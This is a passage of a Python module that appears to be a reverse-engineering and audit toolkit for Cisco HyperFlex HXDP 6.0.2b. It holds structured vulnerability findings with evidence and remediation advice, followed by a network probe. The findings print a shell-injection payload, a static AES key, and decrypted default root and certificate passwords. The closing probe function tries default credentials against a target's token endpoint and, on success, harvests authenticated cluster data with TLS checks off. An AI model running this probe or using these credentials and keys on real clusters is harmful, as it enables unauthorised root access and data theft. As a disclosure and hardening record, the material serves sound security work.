    "description": (
        "The cluster re-registration script constructs a shell command by "
        "directly embedding the user-supplied vCenter password into a format "
        "string, then executes it with `shell=True`, enabling OS command injection "
        "via shell metacharacters in the password field. "
        "reRegisterClusterToVC.py line 39-44: "
        "`cmdStr = 'priv stcli cluster reregister ... "
        "--vcenter-password \\'{}\\''.format(..., vCenterUserPass)`. "
        "Line 54: `proc = Popen(cmd, shell=True, stderr=PIPE, stdout=PIPE)`. "
        "The password is collected via `getpass.getpass()` at line 98 with no "
        "input sanitization. "
        "Single-quote wrapping (`--vcenter-password '{}' `) does not prevent "
        "injection if the password contains a single quote character — the shell "
        "would terminate the quoted string early and interpret subsequent characters "
        "as shell commands. "
        "Dollar-sign characters in the password (`$VARIABLE`) cause shell variable "
        "expansion, potentially disclosing environment variables or altering the "
        "command. "
        "An operator whose vCenter account password contains shell metacharacters "
        "(single quote, backslash, dollar sign) would trigger command execution "
        "outside the intended `priv stcli` invocation, running with the privileges "
        "of the controller VM management process (typically root)."
    ),
    "evidence": [
        "reRegisterClusterToVC.py line 39-44: cmdStr = 'priv stcli cluster reregister ... --vcenter-password \\'{}\\''.format(..., vCenterUserPass)",
        "reRegisterClusterToVC.py line 54: proc = Popen(cmd, shell=True, stderr=PIPE, stdout=PIPE)",
        "reRegisterClusterToVC.py line 98: vc_pass = getpass.getpass('Enter vCenter Password: ') — no sanitization",
        "Shell injection vector: password \"p'ass\" causes: --vcenter-password 'p'ass'",
        "Shell injection vector: password \"p$HOME\" causes $HOME expansion in shell context",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Replace `shell=True` with `shell=False` and pass the command as a list: "
        "`cmd_list = ['priv', 'stcli', 'cluster', 'reregister', "
        "'--vcenter-datacenter', vCenterDC, '--vcenter-cluster', vCenterCluster, "
        "'--vcenter-url', vCenterUrl, '--vcenter-user', vCenterUser, "
        "'--vcenter-password', vCenterUserPass]`; "
        "`proc = Popen(cmd_list, stderr=PIPE, stdout=PIPE)`. "
        "With `shell=False`, the password is passed directly to the process "
        "argument vector without shell interpretation, preventing injection "
        "regardless of password content. "
        "This also prevents password exposure in `/proc/<pid>/cmdline` since "
        "the process table shows separate argv elements rather than a shell string."
    ),
    "tags": ["command-injection", "shell", "vcenter", "cwe-78", "medium"],
}

HX_F213 = {
    "id": "HX-F213",
    "title": "SSO Manager Encryption Key and Credentials Stored in Unauthenticated ZooKeeper",
    "severity": "HIGH",
    "cvss": 7.1,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:H/A:N",
    "cwe": "CWE-312",
    "component": (
        "storfs-mgmt/stSSOMgr-1.0/conf/application.conf"
    ),
    "description": (
        "The HyperFlex SSO Manager stores three categories of sensitive material "
        "in ZooKeeper: authentication keys, session credentials, and the session "
        "token encryption key. With ZooKeeper running unauthenticated by default "
        "(see `useZKAuth = False`, the default in storfs.cfg), any local process "
        "on the controller VM can read these values without credentials. "
        "stSSOMgr-1.0/conf/application.conf defines: "
        "`zkBasePath = '/stSSOMgr'`; "
        "`zkAuthKey = '/auth'` — authentication key at ZK path `/stSSOMgr/auth`; "
        "`zkCredsKey = 'creds'` — session credential store at `/stSSOMgr/creds`; "
        "`zkEncryptionKey = 'keyData'` — session token encryption key at "
        "`/stSSOMgr/keyData`. "
        "The `token_duration_seconds = 1555200` (18 days) from line 4 "
        "matches `defaultTokenLifeTime = 1555200000` in authfilter/application.conf, "
        "confirming these are the same long-lived session tokens used across "
        "all cluster management services. "
        "An attacker with local process access to the controller VM can: "
        "(1) read the encryption key from `/stSSOMgr/keyData` to decrypt or forge "
        "valid 18-day SSO session tokens, bypassing all management API authentication; "
        "(2) enumerate active session credentials from `/stSSOMgr/creds`, enabling "
        "credential replay without brute force. "
        "This is distinct from the SSL private key exposure (HX-F209) — "
        "SSO key compromise enables authentication bypass; SSL key enables "
        "TLS impersonation — both resulting from the same unauthenticated ZK default."
    ),
    "evidence": [
        "stSSOMgr-1.0/conf/application.conf line 12: zkBasePath = '/stSSOMgr'",
        "stSSOMgr-1.0/conf/application.conf line 13: zkAuthKey = '/auth'",
        "stSSOMgr-1.0/conf/application.conf line 14: zkCredsKey = 'creds'",
        "stSSOMgr-1.0/conf/application.conf line 15: zkEncryptionKey = 'keyData'",
        "stSSOMgr-1.0/conf/application.conf line 4: token_duration_seconds = 1555200 (18 days)",
        "authfilter/application.conf: defaultTokenLifeTime = 1555200000 — confirms 18-day cross-service tokens",
        "0008_cleanup_historical_job_ESX.py line 128: useZKAuth = False (ZK unauthenticated default)",
    ],
    "affected_versions": ["HXDP 6.0.2b"],
    "remediation": (
        "Enable ZooKeeper authentication (`useZKAuth=True`) as the default at "
        "provisioning time (see also HX-F209). "
        "Apply ZooKeeper ACLs restricting `/stSSOMgr/keyData`, `/stSSOMgr/creds`, "
        "and `/stSSOMgr/auth` to the stSSOMgr service account only — no world-readable "
        "ACL on these paths. "
        "Store the session token encryption key in a dedicated key management store "
        "(hardware or software KMS/KMIP) rather than ZooKeeper, which was designed "
        "for distributed coordination, not secrets management. "
        "Consider reducing the token lifetime from 18 days to a shorter duration "
        "consistent with security policy to limit the window a stolen token remains valid."
    ),
    "tags": ["zookeeper", "sso", "token-forgery", "encryption-key", "cwe-312", "high"],
}

HX_F214 = {
    "id": "HX-F214",
    "title": "SSH RSA Private Keys and ESXi Credentials Written to World-Accessible /tmp/ During Upgrade",
    "severity": "HIGH",
    "cvss_score": 8.8,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:C/C:H/I:H/A:N",
    "cwe": ["CWE-312", "CWE-732"],
    "component": "storfs-deploy / upgradeclusterposthooks / 0007_create_authorized_keys_for_admin_ESX.py + ansible/commonFunctions.py",
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "During HyperFlex cluster upgrade, the Ansible upgrade hook "
        "`0007_create_authorized_keys_for_admin_ESX.py` reads SSH RSA private keys from "
        "`/tmp/sshKeyPair*.json` and ESXi host credentials from `/tmp/upgradeHooksCreds*.json`. "
        "Both files reside in `/tmp/` (mode 1777), which is world-accessible to all local users "
        "on the controller VM. The RSA private key material (PEM format, `-----BEGIN RSA PRIVATE KEY-----`) "
        "enables SSH authentication as root to all cluster storage controller nodes. The ESXi password "
        "grants access to the hypervisor layer across the cluster. "
        "The post-upgrade cleanup hook (`9997_post_upgrade_cleanup_ESX.py`) only removes the remote "
        "upgrade bundle directory; it does not delete the `/tmp/sshKeyPair*.json` or "
        "`/tmp/upgradeHooksCreds*.json` files, leaving them on disk after upgrade completion. "
        "Additionally, `commonFunctions.py` logs the ESXi password to the INFO log on command "
        "failure: `logging.info('Failed to run command %s on %s', command, node)` where `command` "
        "includes the plaintext password as a positional argument."
    ),
    "evidence": [
        {
            "file": "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/upgradeclusterposthooks/files/0007_create_authorized_keys_for_admin_ESX.py",
            "lines": "17-23",
            "snippet": (
                "JSON_PARAMS_DIR = \"/tmp/\"\n"
                "JSON_CREDS_FILE_MATCH = JSON_PARAMS_DIR + \"upgradeHooksCreds*.json\"\n"
                "JSON_SSH_KEY_FILE_MATCH = JSON_PARAMS_DIR + \"sshKeyPair*.json\"\n"
                "BEGIN_RSA_PRIVATE_KEY = '-----BEGIN RSA PRIVATE KEY-----'\n"
                "END_RSA_PRIVATE_KEY = '-----END RSA PRIVATE KEY-----'"
            ),
            "note": "RSA private key constants confirm PEM key material is stored in the JSON file",
        },
        {
            "file": "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/upgradeclusterposthooks/files/0007_create_authorized_keys_for_admin_ESX.py",
            "lines": "93, 96, 102",
            "snippet": (
                "esxi_password = creds.get('esxPassword').strip()  # plaintext from /tmp/upgradeHooksCreds*.json\n"
                "sshCreds = load_hxvm_credentials()  # RSA private key from /tmp/sshKeyPair*.json\n"
                "command = \"{0} {1} {2} {3}\".format(authKeyCopyingScript, esxi_ip, esxi_username, esxi_password)"
            ),
            "note": "ESXi password in plaintext; also passed as command-line argument (process table exposure)",
        },
        {
            "file": "mgmt/opt/hyperflex/storfs-deploy/ansible/commonFunctions.py",
            "lines": "644-669",
            "snippet": (
                "def load_hxvm_credentials():\n"
                "    credsFile = getMatchingFileName('/tmp/sshKeyPair*.json')\n"
                "    with open(credsFile) as f:\n"
                "        data = json.load(f)\n"
                "    ...\n"
                "def run_command_on_node(node, private_key, command):\n"
                "    updated_private_key = private_key.replace('-----BEGIN PRIVATE KEY-----', '-----BEGIN RSA PRIVATE KEY-----')\n"
                "    keytempfile = io.StringIO(updated_private_key)\n"
                "    key = paramiko.RSAKey.from_private_key(keytempfile)\n"
                "    client.set_missing_host_key_policy(paramiko.AutoAddPolicy())\n"
                "    client.connect(hostname=node, username='root', pkey=key)\n"
                "    ...\n"
                "    logging.info('Failed to run command %s on %s', command, node)  # password in command string"
            ),
            "note": "RSA key loaded directly from /tmp/ JSON; on failure the command (with ESXi password) is INFO-logged",
        },
        {
            "file": "mgmt/opt/hyperflex/storfs-deploy/ansible/roles/upgradeclusterposthooks/files/9997_post_upgrade_cleanup_ESX.py",
            "lines": "20, 29-35",
            "snippet": (
                "removeFilesDir = \"rm -rf \"\n"
                "def deleteUpgradeBundles():\n"
                "    run_command_on_node(node, private_key, removeFilesDir+filesDir)  # remote bundle dir only"
            ),
            "note": "Cleanup hook does not remove /tmp/sshKeyPair*.json or /tmp/upgradeHooksCreds*.json",
        },
    ],
    "impact": (
        "Any local user on the HX controller VM during or after an upgrade can read "
        "`/tmp/sshKeyPair*.json` to obtain the RSA private key used for root SSH access to all "
        "cluster storage nodes. Reading `/tmp/upgradeHooksCreds*.json` yields the ESXi root "
        "password, enabling hypervisor-layer access across the entire cluster. "
        "Because the files are not deleted post-upgrade, the exposure window extends indefinitely. "
        "INFO-level logging of the ESXi password on command failure broadens the exposure surface "
        "to any system or user with access to the application log files."
    ),
    "remediation": (
        "1. Write credential and key files to a mode-0600 directory under `/root/` or "
        "a dedicated secrets path, not `/tmp/`. "
        "2. Explicitly delete `/tmp/sshKeyPair*.json` and `/tmp/upgradeHooksCreds*.json` at the "
        "end of the upgrade hook that creates them (or in `9997_post_upgrade_cleanup_ESX.py`). "
        "3. Do not interpolate passwords into command strings passed to INFO-level log calls; "
        "log only the command name and target host. "
        "4. Where possible, use agent-forwarding or short-lived certificates instead of "
        "persisted RSA private key files."
    ),
    "tags": ["upgrade", "credentials", "private-key", "tmp", "esxi", "cwe-312", "cwe-732", "high"],
}

HX_F215 = {
    "id": "HX-F215",
    "title": "Shell Injection via Unsanitized Password in Curl Command (SwaggerClient._get_auth_token)",
    "severity": "MEDIUM",
    "cvss_score": 5.7,
    "cvss_vector": "CVSS:3.1/AV:L/AC:H/PR:H/UI:N/S:U/C:H/I:H/A:N",
    "cwe": ["CWE-78"],
    "component": "restClientModule/swagger_api_client.py",
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "`SwaggerClient._get_auth_token()` constructs a curl command string by concatenating "
        "`json.dumps(body)` into a single-quoted shell argument and executes it with `shell=True`. "
        "The `body` dict contains the `username` and `password` fields. A single-quote character "
        "(`'`) in either value terminates the shell single-quote boundary, allowing the remainder "
        "of the value to be interpreted as unquoted shell content. "
        "Proof of injection: password value `'; id; echo '` produces the shell command "
        "`curl -d '{\"password\": \"'; id; echo '\"}' ...` in which `; id;` executes as a separate "
        "shell command in the context of the upgrade orchestration process. "
        "The function is reached via `auth_type='token'` in the `SwaggerClient` constructor, "
        "which is the path used when programmatic authentication to the HX REST API is required "
        "during upgrade operations."
    ),
    "evidence": [
        {
            "file": "mgmt/opt/hyperflex/restClientModule/swagger_api_client.py",
            "lines": "204-220",
            "snippet": (
                "def _get_auth_token(self, body):\n"
                "    # TODO: use swagger for aaa\n"
                "    curl_cmd = \"curl -H \\\"Content-Type: application/json\\\" -X POST\" +\\\n"
                "               \" -d '\" + json.dumps(body, ensure_ascii=False) + \"'\" +\\\n"
                "               ' ' + \"https://\" + self.server + \"/aaa/v1/auth?\" +\\\n"
                "               \"grant_type=password -k\"\n"
                "    auth_response = subprocess.Popen(curl_cmd,\n"
                "                                     stdout=subprocess.PIPE,\n"
                "                                     stderr=subprocess.PIPE,\n"
                "                                     shell=True).communicate()[0]"
            ),
            "note": "Single-quote delimiter around json.dumps(body) is broken by any ' in password or username",
        },
        {
            "file": "mgmt/opt/hyperflex/restClientModule/swagger_api_client.py",
            "lines": "68-72",
            "snippet": (
                "elif auth_type == 'token':\n"
                "    if username not in body:\n"
                "        body['username'] = username\n"
                "    if password not in body:\n"
                "        body['password'] = password\n"
                "    auth_resp = self._get_auth_token(body=body)"
            ),
            "note": "Username and password flow into body dict passed to _get_auth_token",
        },
    ],
    "impact": (
        "An operator or process that sets a cluster credential containing a single-quote character "
        "triggers command execution in the upgrade orchestration process context. "
        "The upgrade orchestration process runs with elevated privileges; injected commands "
        "inherit those privileges. The `-k` flag already present in the curl command confirms "
        "TLS verification is also disabled for this authentication call."
    ),
    "remediation": (
        "Replace the `shell=True` curl subprocess with a native Python HTTP request using "
        "`urllib.request` or `http.client`. The `_get_auth_token` method already has a TODO "
        "comment indicating the intent to replace this with a swagger call — implement it. "
        "If the curl invocation must be kept, use `shlex.quote()` on each interpolated value "
        "and pass the command as a list with `shell=False`."
    ),
    "tags": ["shell-injection", "curl", "shell=True", "upgrade", "cwe-78", "medium"],
}

HX_F216 = {
    "id": "HX-F216",
    "title": "ESXi Credentials Exposed as Plaintext ovftool Command-Line Arguments During Factory Deploy",
    "severity": "MEDIUM",
    "cvss_score": 5.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": ["CWE-214"],
    "component": "storfs-factory/ansible/library/deployOva.py",
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "During factory deployment, `deployOva.py` constructs an ovftool command that embeds "
        "the ESXi username and URL-encoded password directly in a `vi://` URL passed as a "
        "command-line argument: "
        "`/usr/bin/ovftool ... vi://<user>:<esxEncodedPassword>@<hostname>`. "
        "The credential string is visible to any local user via `ps aux` or `/proc/<pid>/cmdline` "
        "for the duration of the ovftool process (OVA deployments can take several minutes). "
        "The `log.info()` call that follows records the full stdout/stderr of the ovftool run; "
        "if ovftool echoes the source URL in its output (e.g., on connection failure), "
        "the credentials are also written to the log file at INFO level. "
        "Additionally, `--noSSLVerify` is passed to ovftool, disabling TLS certificate "
        "validation for the vSphere connection during controller VM deployment."
    ),
    "evidence": [
        {
            "file": "storfs-factory/ansible/library/deployOva.py",
            "lines": "71-81",
            "snippet": (
                "cmd = \"/usr/bin/ovftool --allowExtraConfig --acceptAllEulas "
                "--disableVerification --noSSLVerify --datastore='\" + datastore +\n"
                "   \"' --network=\\\"\" + network + \"\\\" --name=\" + name + \" \" + ovalocation + \" vi:\\/\\/ \" +  esxUserName +\n"
                "  \":\" + esxEncodedPassword + \"@\" + hostname\n"
                "log.info(\"Deploying controller VM using ovftool for \" + modelNumber)\n"
                "cmd = subprocess.Popen(shlex.split(cmd), shell=False, ...)\n"
                "out, err = cmd.communicate()\n"
                "log.info(\"Deploying controller VM using ovftool. Return code: {0} output: {1} err: {2}\"\n"
                "         .format(str(cmd.returncode), str(out), str(err)))"
            ),
            "note": "vi:// URL with esxEncodedPassword in positional args; noSSLVerify also present",
        },
        {
            "file": "storfs-factory/ansible/library/deployOva.py",
            "lines": "40-42",
            "snippet": (
                "esxPassword = (base64.b64decode(module.params['esxPassword']).strip())\n"
                "try:\n"
                "    esxPassword = esxPassword.decode('utf-8')"
            ),
            "note": "Password is base64-decoded at runtime; the decoded plaintext is what appears in the process args",
        },
    ],
    "impact": (
        "Any local user on the factory provisioning host can read ESXi root credentials from "
        "`/proc/<ovftool_pid>/cmdline` or `ps aux` during OVA deployment. "
        "ESXi root credentials grant full hypervisor access, enabling VM inspection, disk "
        "access, and potential lateral movement to all VMs on the host. "
        "The `--noSSLVerify` flag compounds the risk by allowing a network attacker to "
        "MITM the vSphere connection during initial controller VM deployment."
    ),
    "remediation": (
        "1. Pass ESXi credentials to ovftool via an options file (`--optionFile`) or "
        "environment variables rather than command-line arguments. "
        "2. Remove `--noSSLVerify` and configure a trusted CA for factory provisioning. "
        "3. Do not log raw stdout/stderr of processes that may contain credential material; "
        "log only return code and sanitized status."
    ),
    "tags": ["factory", "credentials", "process-args", "esxi", "noSSLVerify", "cwe-214", "medium"],
}

HX_F217 = {
    "id": "HX-F217",
    "title": "Cluster Credential AES Encryption Key Statically Derived from World-Readable Shipped Firmware File",
    "severity": "HIGH",
    "cvss_score": 6.5,
    "cvss_vector": "CVSS:3.1/AV:L/AC:L/PR:L/UI:N/S:U/C:H/I:N/A:N",
    "cwe": ["CWE-321"],
    "component": "storfs-misc/springpath_env_parse.py + springpath_default.tunes",
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "`springpath_env_parse.py` encrypts and decrypts sensitive credential values in tunes "
        "configuration files using AES-256-CBC. The encryption key is derived exclusively from "
        "the MD5 hexdigest of `/usr/share/hyperflex/storfs-misc/Secret.class`, a compiled Java "
        "class file shipped with the firmware at a world-readable path (`-rwxr-xr-x`). "
        "Because `Secret.class` is static and identical across all HXDP 6.0.2b deployments, "
        "the AES key is the same for every HyperFlex cluster running this firmware version. "
        "The key derivation is: `key = hashlib.md5(Secret.class_bytes).hexdigest()` "
        "(32-char hex string as UTF-8 = 32-byte AES-256 key). "
        "Proof: for HXDP 6.0.2b, `md5(Secret.class)` = `1f6d13bcd7753f2d3b2e2da361b7afb5`. "
        "Applying this key to the AES-CBC blobs in `springpath_default.tunes` yields: "
        "`stctl_vm_passwd` = `Cisco123`, `ssl_cert_passwd` = `springpath`. "
        "Any attacker with access to the firmware image (publicly distributed) and any cluster's "
        "tunes file can decrypt all cluster credentials without any cluster-specific secret."
    ),
    "evidence": [
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/springpath_env_parse.py",
            "lines": "30-35, 45-53, 69-87",
            "snippet": (
                "ENV_VARIABLE_STCTL_PASS = \"/usr/share/hyperflex/storfs-misc/Secret.class\"\n"
                "def md5(fname):\n"
                "    hash_md5 = hashlib.md5()\n"
                "    with open(fname, 'rb') as f:\n"
                "        for chunk in iter(lambda: f.read(4096), b''): hash_md5.update(chunk)\n"
                "    return hash_md5.hexdigest()\n"
                "def decrypt(key, enc):\n"
                "    enc = base64.b64decode(enc)\n"
                "    iv = enc[:16]\n"
                "    cipher = AES.new(key.encode('utf8'), AES.MODE_CBC, iv)\n"
                "    return unpad(cipher.decrypt(enc[16:]))\n"
                "if tokens[1] in ('stctl_vm_passwd', 'ssl_cert_passwd', 'installer_passwd'):\n"
                "    file_md5 = md5(ENV_VARIABLE_STCTL_PASS)\n"
                "    decoded = decrypt(file_md5, value)\n"
                "    return decoded"
            ),
            "note": "Key = MD5(Secret.class); static across all 6.0.2b deployments",
        },
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/Secret.class",
            "lines": "n/a",
            "snippet": "Permissions: -rwxr-xr-x (world-readable)\nMD5: 1f6d13bcd7753f2d3b2e2da361b7afb5",
            "note": "World-readable shipped binary; its MD5 is the AES key",
        },
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/springpath_default.tunes",
            "lines": "credentials section",
            "snippet": (
                "[credentials]\n"
                "stctl_vm_uname=root\n"
                "stctl_vm_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
                "ssl_cert_passwd=yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=\n"
                "installer_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU="
            ),
            "note": "Decrypts to: stctl_vm_passwd=Cisco123, ssl_cert_passwd=springpath (verified)",
        },
    ],
    "impact": (
        "An attacker with access to the HXDP firmware image (publicly distributed) can derive "
        "the AES key without any cluster access and use it to decrypt credentials from any "
        "cluster's tunes files obtained via other means (backup access, log exfiltration, "
        "ZooKeeper read). "
        "The tunes files themselves reside on the controller VM; on a live cluster, any local "
        "user who can read `/opt/hyperflex/springpath_custom_cluster.tunes` can decrypt all "
        "cluster credentials including the SSH root password for all nodes and the SSL certificate "
        "private key passphrase."
    ),
    "remediation": (
        "1. Generate a unique per-cluster encryption key at install time using a CSPRNG; "
        "do not derive the key from any shipped file. "
        "2. Store the per-cluster key in a hardware-backed secret store (TPM, HSM, or at minimum "
        "a root-owned directory with mode 0600). "
        "3. Do not use MD5 as a key derivation function; use PBKDF2, scrypt, or HKDF with "
        "a random salt. "
        "4. Consider using an OS-level secret store (libsecret, vault, or credential manager) "
        "instead of encrypted flat files."
    ),
    "tags": ["credentials", "aes", "static-key", "Secret.class", "tunes", "cwe-321", "high"],
}

HX_F218 = {
    "id": "HX-F218",
    "title": "Default Cluster Node SSH Root Password 'Cisco123' Shipped in Firmware Default Tunes",
    "severity": "CRITICAL",
    "cvss_score": 9.8,
    "cvss_vector": "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
    "cwe": ["CWE-798"],
    "component": "storfs-misc/springpath_default.tunes",
    "firmware_version": "HXDP 6.0.2b",
    "description": (
        "The shipped `springpath_default.tunes` file sets the default cluster controller VM "
        "SSH password (`stctl_vm_passwd`) and installer password (`installer_passwd`) to "
        "`Cisco123`. This password is used by `springpath_env_parse.py` for SSH authentication "
        "to all cluster storage controller nodes (`stctl_vm_uname=root`). "
        "The value is AES-encrypted in the tunes file but the encryption key is statically "
        "derived from the shipped `Secret.class` file (see HX-F217), making the default "
        "credential recoverable from the firmware image. "
        "Proof of default credential: decrypting `stctl_vm_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=` "
        "with key `1f6d13bcd7753f2d3b2e2da361b7afb5` (MD5 of Secret.class) yields `Cisco123`. "
        "Separately: the SSL certificate private key passphrase `ssl_cert_passwd` decrypts to `springpath`. "
        "Any cluster that has not overridden these defaults in `springpath_custom_cluster.tunes` "
        "or `springpath_custom_node.tunes` accepts `Cisco123` as the root SSH password for "
        "all storage controller VMs."
    ),
    "evidence": [
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/springpath_default.tunes",
            "lines": "credentials section",
            "snippet": (
                "stctl_vm_uname=root\n"
                "stctl_vm_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU=\n"
                "ssl_cert_passwd=yWK4pTIUEr0TCjpQdp9sb/KW404x6Id/6ImlCOWdG7s=\n"
                "installer_passwd=DC4R6Rv9Zv8RhHJfuWeEAVqNUhdieK7vJMiXv3tPYDU="
            ),
            "note": "Verified decryption: stctl_vm_passwd=Cisco123, ssl_cert_passwd=springpath",
        },
        {
            "file": "misc/usr/share/hyperflex/storfs-misc/springpath_env_parse.py",
            "lines": "75-88",
            "snippet": (
                "def parseEnvVariableTunes(env_variable):\n"
                "    value = parseEnvVariableTunesFile(ENV_VARIABLES_FILE_CUSTOM_NODE, ...)\n"
                "    if not value:\n"
                "        value = parseEnvVariableTunesFile(ENV_VARIABLES_FILE_CUSTOM_CLUSTER, ...)\n"
                "    if not value:\n"
                "        value = parseEnvVariableTunesFile(ENV_VARIABLES_FILE_DEFAULT, ...)  # springpath_default.tunes\n"
                "    decoded = decrypt(file_md5, value)\n"
                "    return decoded"
            ),
            "note": "Default tunes used when neither custom_node nor custom_cluster overrides exist",
        },
    ],
    "impact": (
        "Any cluster where the default `stctl_vm_passwd` has not been overridden accepts SSH "
        "root authentication with `Cisco123`. This grants full operating system access to all "
        "storage controller VMs. The same credential is used programmatically across multiple "
        "management scripts (node_replace.py, post_install.py, support.py, validation_validator.py), "
        "meaning a single credential enables broad cluster-wide access. "
        "The SSL certificate passphrase `springpath` also compromises the cluster TLS private "
        "key if the certificate password protection is the only barrier to key access."
    ),
    "remediation": (
        "1. Remove hardcoded default credentials from the shipped firmware. "
        "2. Generate a cryptographically random per-cluster password at initial provisioning "
        "and store it in a secrets manager, never in a flat tunes file. "
        "3. Require password change on first boot before any cluster node is reachable via SSH. "
        "4. Audit all existing deployments that may still use the `Cisco123` default."
    ),
    "tags": ["default-credentials", "ssh", "root", "Cisco123", "cwe-798", "critical"],
}

for _f in [
    HX_F120, HX_F121, HX_F122, HX_F123, HX_F124, HX_F125, HX_F126,
    HX_F127, HX_F128, HX_F129, HX_F130, HX_F131, HX_F132, HX_F133, HX_F134,
    HX_F135, HX_F136, HX_F137, HX_F138, HX_F139, HX_F140, HX_F141, HX_F142,
    HX_F143, HX_F144, HX_F145, HX_F146, HX_F147, HX_F148, HX_F149, HX_F150,
    HX_F151, HX_F152, HX_F153, HX_F154, HX_F155, HX_F156,
    HX_F157, HX_F158, HX_F159, HX_F160, HX_F161, HX_F162,
    HX_F163, HX_F164, HX_F165, HX_F166,
    HX_F167, HX_F168, HX_F169, HX_F170,
    HX_F171, HX_F172, HX_F173, HX_F174,
    HX_F175, HX_F176,
    HX_F177, HX_F178, HX_F179,
    HX_F180, HX_F181, HX_F182,
    HX_F183, HX_F184,
    HX_F185, HX_F186, HX_F187,
    HX_F188, HX_F189, HX_F190,
    HX_F191, HX_F192, HX_F193, HX_F194,
    HX_F195, HX_F196,
    HX_F197, HX_F198,
    HX_F199, HX_F200, HX_F201,
    HX_F202, HX_F203, HX_F204,
    HX_F205, HX_F206, HX_F207,
    HX_F208, HX_F209, HX_F210,
    HX_F211, HX_F212, HX_F213,
    HX_F214,
    HX_F215, HX_F216,
    HX_F217, HX_F218,
]:
    FINDINGS[_f["id"]] = _f


# ─── Probe Functions ──────────────────────────────────────────────────────────

def _ssl_ctx() -> ssl.SSLContext:
    ctx = ssl.create_default_context()
    ctx.check_hostname = False
    ctx.verify_mode = ssl.CERT_NONE
    return ctx


def _hx_request(host: str, path: str, method: str = "GET",
                 token: Optional[str] = None, body: Optional[dict] = None,
                 timeout: int = 8) -> Optional[dict]:
    url = f"https://{host}{path}"
    data = json.dumps(body).encode() if body else None
    req = urllib.request.Request(url, data=data, method=method)
    req.add_header("Content-Type", "application/json")
    req.add_header("Accept", "application/json")
    if token:
        req.add_header("hx-auth-token", token)
    try:
        with urllib.request.urlopen(req, context=_ssl_ctx(), timeout=timeout) as r:
            raw = r.read()
            return json.loads(raw) if raw else {}
    except urllib.error.HTTPError as e:
        return {"__http_error": e.code, "__reason": str(e.reason)}
    except Exception:
        return None


def probe_hx_connect(host: str, timeout: int = 8) -> dict:
    result = {
        "host": host, "port": HX_CONNECT_PORT, "reachable": False,
        "version": None, "unauth_data": {}, "cred_result": None,
        "auth_data": {}, "intersight_claim_code": None,
    }

    try:
        s = socket.create_connection((host, HX_CONNECT_PORT), timeout=timeout)
        s.close()
        result["reachable"] = True
    except Exception:
        return result

    for path in HX_UNAUTH_PATHS:
        data = _hx_request(host, path, timeout=timeout)
        if data and "__http_error" not in data:
            result["unauth_data"][path] = data
            if "version" in data or "hxVersion" in data:
                result["version"] = data.get("version") or data.get("hxVersion")

    token = None
    for user, passwd in HX_DEFAULT_CREDS:
        body = {"username": user, "password": passwd}
        resp = _hx_request(host, "/rest/v1/tokens", method="POST",
                           body=body, timeout=timeout)
        if resp and "token" in resp:
            token = resp["token"]
            result["cred_result"] = {"user": user, "pass": passwd}
            break
        if resp and "__http_error" in resp and resp["__http_error"] == 429:
            break

    if token:
        for key, path in HX_AUTH_PATHS.items():
            data = _hx_request(host, path, token=token, timeout=timeout)
            if data and "__http_error" not in data:
                result["auth_data"][key] = data

        conn = result["auth_data"].get("intersight_conn", {})
        result["intersight_claim_code"] = conn.get("claimCode") or conn.get("deviceId")

    return result


if __name__ == "__main__":
    import sys

    print("=== Cisco HyperFlex RE Module ===")
    print(f"Findings: {len(FINDINGS)} (HX-F01 through HX-F{max(int(k.split('-F')[1]) for k in FINDINGS)})")
    print()

    for fid, f in FINDINGS.items():
        sev = f["severity"]
        print(f"[{sev:8}] {fid}: {f['title']}")

    if len(sys.argv) > 1:
        target = sys.argv[1]
        print(f"[*] Probing {target}")
        print(json.dumps(probe_hx_connect(target), indent=2))
